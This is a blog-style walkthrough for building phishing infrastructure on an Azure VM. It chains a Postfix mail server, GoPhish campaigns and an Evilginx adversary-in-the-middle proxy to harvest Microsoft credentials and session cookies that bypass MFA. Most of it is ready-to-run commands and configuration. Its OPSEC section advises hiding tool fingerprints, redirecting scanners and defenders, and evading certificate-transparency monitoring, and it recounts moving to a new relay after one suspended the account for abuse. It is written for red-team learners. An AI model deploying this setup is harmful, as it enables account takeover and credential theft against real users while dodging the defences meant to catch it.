Today, we’re setting up email. Those of you who are familiar with the self-hosting sphere know how much of a pain it is to set up email yourself. Hopefully, this guide will help beginner red teamers or just curious people understand the specific way I set up my phishing infrastructure.

Registering a Domain Name && Setting up an Azure VM

I’ll be combining Azure, Namecheap and Cloudflare for this part, but you can choose any alternatives that you like for any of these services.

Registering a Domain

First thing to do of course, is to get yourself a domain name, I got mine from Namecheap but you can use whatever domain registrar you’re familiar with.

I next sat up mine with Cloudflare, but you don’t necessarily have to for this specific guide.

Setting up an Azure VM

Provisioning

I won’t go into too much detail concerning how to provision a compute resource from Azure, it’s pretty straight forward, but for the sake of clarity, here’s the parameters I chose :

  • Ubuntu server 24.04 LTS
  • 2 vCPUs
  • 8 GB of RAM

The rest of the parameters don’t really matter that much for the purposes of this post.

Network Settings

Since we’ll be experimenting with email, there are a few ports we’ll need to open.

  • Inbound

    • 80 : Needed by Certbot and for the ACME challenge later on (you can disallow it afterward).
    • 443 : HTTPS since we’ll be using real looking websites that need to run on the default port.
    • 25/465/587 : SMTP

  • Outbound

    • Everything

DNS Records

You’ll need to add a few DNS records throughout this entire post, but for now, start by setting the following ones :

  • MX : domain.name -> mail.domain.name
  • A : mail -> 11.10.09.08 (Your VM IP)
  • TXT : domain.name -> “v=spf1 ip4:11.10.09.08 -all”

note : Throughout this article, I’ll be referring to the domain name as domain.name (you should change that with the one you bought) and the IP of the VM will be 11.10.09.08 (Also change it)

If you’re not familiar with SPF, it stands for Sender Policy Framework which is an email authentication method that verifies whether a mail server is authorized to send emails on behalf of a specific domain.

  • v=spf1 : SPF version
  • ip4:11.10.09.08 : ONLY your Azure VM is allowed to send mail
  • -all : hard fail for anything else (strict, recommended for security)

Also think of removing any remaining DNS records that relate to your registrar.

Email Services

Installing Postfix

On your Azure VM:

sudo apt update
sudo apt install postfix openssl -y

Configuring Postfix

When a configuration screen pops up, you’ll need to choose Internet Site.

And input your domain name.

Now prepare yourself for a bunch of troubleshooting steps, I’ll leave my censored config file at the bottom of this article. We need to adjust it to support authenticated SMTP, TLS encryption, and external relay handling.

Most of this configuration happens in /etc/postfix/main.cf

Basic Identity Configuration

First, we define the identity of the mail server :

myhostname = mail.domain.name
mydomain = domain.name
myorigin = $mydomain
inet_interfaces = all
mydestination = $myhostname, localhost.$mydomain, localhost

This ensures the server correctly identifies itself when sending emails.

Enabling SMTP Authentication (SASL)

To allow authenticated users to send emails through the server, we enable SASL authentication:

smtpd_sasl_type = dovecot
smtpd_sasl_path = private/auth

smtpd_sasl_auth_enable = yes
smtpd_sasl_security_options = noanonymous

This is what allows tools like Gophish (or any SMTP client) to authenticate using a username and password before sending mail.

Enabling TLS encryption (STARTTLS / SMTPS)

First, we install certbot and get our TLS certificate :

sudo apt install certbot -y

sudo certbot certonly --standalone -d mail.domain.name
sudo certbot certonly --standalone -d *.domain.name

Then you’ll have to change the /etc/postfix/main.cf file :

smtpd_tls_cert_file = /etc/letsencrypt/live/mail.domain.name/fullchain.pem
smtpd_tls_key_file  = /etc/letsencrypt/live/mail.domain.name/privkey.pem

smtpd_use_tls = yes
smtpd_tls_auth_only = yes
smtpd_tls_security_level = may

smtp_tls_security_level = encrypt
smtp_tls_CAfile = /etc/ssl/certs/ca-certificates.crt
smtp_tls_CApath = /etc/ssl/certs

DKIM Integration (OpenDKIM)

At this point, emails can be sent, but that doesn’t mean they’ll be trusted.

This is where DKIM (DomainKeys Identified Mail) comes in. It’s an authentication mechanism that allows a mail server to cryptographically sign outgoing emails, proving that they were actually sent by your domain and not modified in transit.

Install OpenDKIM
sudo apt install opendkim opendkim-tools -y
Generate DKIM Keys

Create a directory for your domain:

sudo mkdir -p /etc/opendkim/keys/domain.name
cd /etc/opendkim/keys/domain.name

Generate the key pair:

sudo opendkim-genkey -s mail -d domain.name

This creates two files:

  • mail.private : private key (keep this on the server)
  • mail.txt : DNS record (public key)
Fix Permissions

OpenDKIM needs access to the private key:

sudo chown -R opendkim:opendkim /etc/opendkim/keys
sudo chmod 700 /etc/opendkim/keys/domain.name
sudo chmod 600 /etc/opendkim/keys/domain.name/mail.private
Configure OpenDKIM

Edit /etc/opendkim.conf. Make sure you have:

Socket                  inet:8891@localhost

KeyTable                /etc/opendkim/key.table
SigningTable            refile:/etc/opendkim/signing.table
Create KeyTable
sudo nano /etc/opendkim/key.table

Add mail._domainkey.domain.name domain.name:mail:/etc/opendkim/keys/domain.name/mail.private

Create SigningTable
sudo nano /etc/opendkim/signing.table

Add *@domain.name mail._domainkey.domain.name

##### Add DKIM DNS record

Open the generated file:

cat /etc/opendkim/keys/domain.name/mail.txt

You’ll see something like:

Add this as a TXT record in your DNS:

  • Name: mail._domainkey.domain.name
  • Value: everything inside the quotes (concatenated into one line)
Verify DKIM

Check that the key is correctly published:

sudo opendkim-testkey -d domain.name -s mail -vvv

Expected result:

Setting up DMARC (Domain Policy Layer)

At this point, SPF and DKIM are already configured. However, modern mail providers also rely on DMARC to decide how to handle unauthenticated emails.

DMARC acts as a policy layer on top of SPF and DKIM, defining what happens when authentication fails.

Adding a DMARC Record

_dmarc.domain.name

Value: v=DMARC1; p=none; rua=mailto:admin@domain.name

Extra Touches

I would also advise adding a user to send emails, in this case I added mailuser

sudo adduser mailuser

You’ll need the username and password in base64 for testing later on.

The email will be queued and the logs will show that it is sent but it won’t actually go beyond the filters that Azure set in place. So we’ll have to set up an email relay that can actually propagate our emails.

Using an SMTP Relay (Outbound Delivery)

In this setup, I initially used Brevo, which provides authenticated SMTP access over port 587. However, the account was later suspended due to automated abuse detection systems, which are commonly triggered when sending patterns resemble phishing or non-standard transactional behavior.

After this, I switched to Resend, which is more developer-oriented and better suited for programmatic email delivery in testing environments, provided proper domain authentication (SPF, DKIM, DMARC) is correctly configured.

Configuring Postfix to Use Resend

You’ll need to sign up to Resend (for free), approve your domain (very easy on screen steps provided by resend) and get your API key that would be used as a password later on.

We now modify Postfix to route all outbound emails through the relay provider instead of sending them directly.

Edit /etc/postfix/main.cf:

relayhost = [smtp-relay.provider.com]:587

smtp_sasl_auth_enable = yes
smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
smtp_sasl_security_options = noanonymous

smtp_use_tls = yes
smtp_tls_security_level = encrypt

##### Adding Relay Credentials

Create the authentication file:

sudo nano /etc/postfix/sasl_passwd

Format: [smtp-relay.provider.com]:587 username:password

The username will always be resend for this setup and the password would be the API key.

Then apply the configuration:

sudo postmap /etc/postfix/sasl_passwd
sudo chmod 600 /etc/postfix/sasl_passwd*
sudo systemctl restart postfix

Now if you do same test as earlier, it normally should work.

Setting Up the Phishing Pipeline

Now that we have a working email infrastructure, it’s time to build the actual phishing pipeline on top of it. This is where things get interesting. We’ll be adding two tools to our existing VM: GoPhish for campaign management and email tracking, and Evilginx for adversary-in-the-middle credential harvesting.

The goal is to have a complete chain:

GoPhish (sends email) → target clicks link → Evilginx (captures credentials + session tokens) → Mythic C2 (post-exploitation)

Before diving in, it’s worth understanding why we need both tools. GoPhish handles the email delivery side, it lets you manage campaigns, track who opened emails, who clicked links, and who submitted credentials. Evilginx, on the other hand, is a Man-in-the-Middle proxy that sits between the victim and the real login page. Instead of faking a login page, it proxies the actual website, which means the victim sees a fully legitimate interface: valid TLS certificate, real branding, real behavior. The crucial difference is that Evilginx captures not just credentials, but authenticated session cookies, which means MFA is bypassed entirely.

DNS Records

Before installing anything, we need to update our DNS configuration. We’ll be adding two new subdomains:

  • track.domain.name : GoPhish’s phishing listener, used for link tracking and click detection
  • login.domain.name : Evilginx’s proxy endpoint, where victims will land

In Cloudflare (or your DNS provider), add the following A records, both pointing to your VM’s public IP:

Type Name Value Proxy Status
A track 11.10.09.08 DNS only (grey)
A login 11.10.09.08 DNS only (grey)

Both records must be set to DNS only (grey cloud in Cloudflare). If they are proxied through Cloudflare, Evilginx won’t be able to perform TLS termination, and GoPhish’s tracking will break. This is a common mistake, Cloudflare’s proxy layer interferes with the way both tools handle HTTPS.

Firewall / NSG Rules

On Azure, make sure the following inbound port rules are configured on your VM’s Network Security Group:

Port Protocol Purpose
80 TCP ACME challenge (cert issuance)
443 TCP Evilginx + GoPhish HTTPS
3333 TCP GoPhish admin UI

Port 3333 is GoPhish’s admin interface. We’ll be accessing it through an SSH tunnel, so it doesn’t strictly need to be public-facing, but opening it on the NSG level makes initial setup easier. You can restrict it to your IP only for better OPSEC.

TLS Certificates

Since we already have certbot installed and configured, and since we already have a wildcard certificate for *.domain.name, we don’t need to issue any new certificates. The wildcard covers both track.domain.name and login.domain.name automatically.

Verify the existing wildcard cert:

sudo certbot certificates

You should see something like:

Certificate Name: domain.name
  Domains: *.domain.name
  Expiry Date: 2026-07-16 (VALID: 87 days)
  Certificate Path: /etc/letsencrypt/live/domain.name/fullchain.pem
  Private Key Path: /etc/letsencrypt/live/domain.name/privkey.pem

We’ll be referencing these certificate paths throughout the nginx and Evilginx configurations.

Evilginx

What Is Evilginx?

Evilginx is an adversary-in-the-middle attack framework that works by acting as a reverse proxy between the victim and a legitimate website. When a victim visits your Evilginx lure URL:

  1. Evilginx proxies all requests transparently to the real website (e.g. Microsoft, Google)
  2. The victim sees the real login page with a valid TLS certificate
  3. Evilginx intercepts and stores the credentials entered
  4. Evilginx also captures the authenticated session cookies returned after login

That last point is what makes Evilginx particularly powerful, because it captures post-authentication session cookies, it completely bypasses MFA. It doesn’t matter if the target uses SMS codes, authenticator apps, or hardware keys. Once they log in, you have their session.

Evilginx uses phishlets, YAML configuration files that describe how to proxy a specific target website. The community maintains phishlets for Microsoft 365, Google, LinkedIn, and many others.

Installation

Download the latest release from GitHub:

cd /opt
sudo wget https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.zip
mkdir evilginx && cd evilginx && mv ../evilginx-v3.3.0-linux-64bit.zip ./
sudo unzip evilginx-v3.3.0-linux-64bit.zip
sudo chmod +x evilginx

Create a directory for phishlets if it’s not already there:

sudo mkdir -p /opt/evilginx/phishlets

Phishlets

Evilginx 3.x ships with only a minimal example phishlet by default. To get real phishlets for Microsoft, Google, and others, we pull from the community collection:

cd /opt/evilginx/phishlets
sudo git clone https://github.com/An0nUD4Y/Evilginx-Phishlets.git

I only installed the Microsoft phishlet for testing, but if you did things right, you’ll have way more.

nginx as a Front Router

Since we’re running both GoPhish and Evilginx on the same VM, and since nginx is already present and handling port 443, we need a smart routing strategy.

The challenge with Evilginx specifically is that it needs to proxy multiple subdomains simultaneously. For example, the Microsoft phishlet creates entries for login.domain.name, cdn.domain.name, account.domain.name, and several others. A standard HTTP reverse proxy like nginx can’t handle this because Evilginx needs to perform its own TLS termination per subdomain.

The solution is to use nginx’s stream module with ssl_preread. Instead of terminating TLS itself for Evilginx traffic, nginx reads the SNI (Server Name Indication) field from the TLS handshake without decrypting it, and forwards the raw TCP stream to the appropriate backend based on the hostname.

This means:

  • nginx owns port 443
  • Traffic to login.domain.name -> forwarded as raw TCP to Evilginx on port 8880
  • Traffic to track.domain.name -> nginx terminates TLS and proxies HTTP to GoPhish on port 8080

First, verify the stream SSL preread module is available:

nginx -V 2>&1 | grep stream_ssl_preread

Edit /etc/nginx/nginx.conf and add the stream block at the very bottom, outside the http {} block:

stream {
    map $ssl_preread_server_name $backend {
        login.domain.name  127.0.0.1:8880;
        default            127.0.0.1:8443;
    }

    server {
        listen 443;
        proxy_pass $backend;
        ssl_preread on;
    }
}

Then create the GoPhish site config at /etc/nginx/sites-available/gophish:

# GoPhish : track.domain.name
server {
    listen 80;
    server_name track.domain.name;
    return 301 https://$host$request_uri;
}
server {
    listen 8443 ssl;
    server_name track.domain.name;
    ssl_certificate /etc/letsencrypt/live/domain.name/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/domain.name/privkey.pem;
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

Enable the config and reload:

sudo ln -s /etc/nginx/sites-available/gophish /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx

Configuring Evilginx

Evilginx 3.x stores its configuration in ~/.evilginx/config.json (when run as root, this is /root/.evilginx/config.json). Edit it to set the domain, external IP, and HTTPS port.

{
  "general": {
    "autocert": true,
    "bind_ipv4": "",
    "dns_port": 53,
    "domain": "domain.name",
    "external_ipv4": "11.10.09.08",
    "https_port": 8880,
    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
  }
}

A few things to note here:

  • https_port: 8880 : Evilginx listens on this non-standard port, since nginx owns 443
  • autocert: true : Evilginx will use Let’s Encrypt to issue its own certificates for each phishlet subdomain
  • unauth_url : where unauthorized visitors (bots, scanners) get redirected. Using a benign URL here is good OPSEC

For autocert to work, Evilginx needs to issue certificates for every subdomain the phishlet creates. For the Microsoft phishlet, this means issuing certs for login.domain.name, cdn.domain.name, account.domain.name, etc. All of these need to have DNS A records pointing to your VM.

Add the following records in Cloudflare for the Microsoft phishlet (all DNS only, grey cloud):

Name Value
cdn 11.10.09.08
account 11.10.09.08
storage 11.10.09.08
outlook 11.10.09.08
microsoft 11.10.09.08
ssl 11.10.09.08
academy 11.10.09.08

I took the liberty to modify the phishlet’s YAML file to fit my needs.

Since Evilginx 3.x is an interactive CLI tool rather than a traditional daemon, we run it in a terminal session. Start it with:

sudo /opt/evilginx/evilginx -p /opt/evilginx/phishlets -c /root/.evilginx

This returns a URL like https://login.domain.name/xxxxxxxx. This is what we’ll embed in our phishing emails.

Open the lure URL in a browser. You should see the real Microsoft login page served through your proxy, with a valid TLS certificate issued for login.domain.name.

You’ll see the captured credentials and session cookies. The cookies can be imported directly into a browser using a cookie editor extension, giving you an authenticated session that bypasses MFA entirely.

GoPhish

What Is GoPhish?

GoPhish is an open-source phishing framework designed for red teams and security professionals. It provides a web-based admin interface where you can:

  • Create email templates with tracking pixels and custom links
  • Define sending profiles (SMTP relay configuration)
  • Build target groups from CSV or manual entry
  • Launch campaigns and track results in real time: opens, clicks, submitted credentials

In our setup, GoPhish handles the delivery side. It sends emails through our Postfix relay, tracks who clicks the link, and redirects targets to the Evilginx lure URL where credential harvesting happens.

Installation

Download the latest GoPhish release:

cd /opt
sudo wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
sudo unzip gophish-v0.12.1-linux-64bit.zip -d gophish
cd gophish
sudo chmod +x gophish

Configuration

Edit the GoPhish config file:

sudo nano /opt/gophish/config.json

{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/domain.name/fullchain.pem",
    "key_path": "/etc/letsencrypt/live/domain.name/privkey.pem"
  },
  "phish_server": {
    "listen_url": "127.0.0.1:8080",
    "use_tls": false,
    "cert_path": "",
    "key_path": ""
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_",
  "contact_address": "",
  "logging": {
    "filename": "",
    "level": ""
  }
}

Key points:

  • The admin server binds to 127.0.0.1 only : it’s never directly exposed to the internet. We access it via SSH tunnel.
  • The phish server binds to 127.0.0.1:8080 : nginx receives traffic on 8443 and proxies it here.
  • TLS is handled by the wildcard cert we already have.

cd /opt/gophish
sudo ./gophish

Since the admin interface binds to localhost only, access it via SSH port forwarding. On your local machine:

OPSEC Considerations

A few things worth keeping in mind when operating this infrastructure:

Domain aging : freshly registered domains have poor reputation. Where possible, register your domain at least 30 days before an engagement and set up the DNS records early to build some history.

Email headers : GoPhish adds an X-Mailer: gophish header by default. Patch the binary or modify the source to remove this obvious indicator.

Lure URL length : Evilginx generates short random paths by default. Consider customizing them to look more like legitimate reset or verification URLs (e.g. /identity/verify?token=...).

Unauth redirect : configure Evilginx’s unauth_url to redirect unknown visitors (bots, scanners, blue teamers) to a benign site. The YouTube rickroll default is fine for labs, but use something more plausible for real engagements.

Certificate transparency : every Let’s Encrypt certificate is logged publicly in CT logs. If a blue team is monitoring CT logs for your domain, they’ll see your phishlet subdomains. Consider using a different CA or purchasing a wildcard certificate through a registrar.

Callback domain : ideally your Mythic C2 and your phishing infrastructure use entirely separate domains and VMs. Correlation between the two can expose your full infrastructure if either gets flagged.
